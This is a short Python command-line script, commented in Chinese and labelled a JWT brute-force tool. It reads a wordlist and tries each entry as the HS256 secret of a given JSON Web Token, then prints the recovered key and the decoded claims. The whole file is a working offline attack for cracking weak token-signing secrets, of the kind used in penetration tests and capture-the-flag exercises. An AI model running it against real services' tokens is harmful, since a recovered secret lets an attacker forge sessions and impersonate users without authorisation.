import argparse
import jwt

def decode_jwt(jwt_token, key):
    try:
        # 尝试用提供的密钥解码 JWT
        decoded = jwt.decode(jwt_token, key, algorithms=["HS256"])
        return decoded
    except jwt.InvalidTokenError:
        return None

def brute_force_jwt(jwt_token, wordlist):
    for key in wordlist:
        decoded = decode_jwt(jwt_token, key.strip())
        if decoded:
            print(f"成功解码! 密钥: {key.strip()}")
            print("解码内容:", decoded)
            return
    print("无法解码JWT，请检查字典或密钥。")

def main():
    # 设置命令行参数解析
    parser = argparse.ArgumentParser(description="JWT爆破工具")
    parser.add_argument('--list', type=str, required=True, help="字典路径")
    parser.add_argument('--decode', type=str, required=True, help="JWT加密信息")
    args = parser.parse_args()

    # 读取字典文件
    try:
        with open(args.list, 'r',errors='ignore') as f:
            wordlist = f.readlines()
    except FileNotFoundError:
        print(f"字典文件 {args.list} 未找到。")
        return

    # 开始爆破
    brute_force_jwt(args.decode, wordlist)

if __name__ == '__main__':
    main()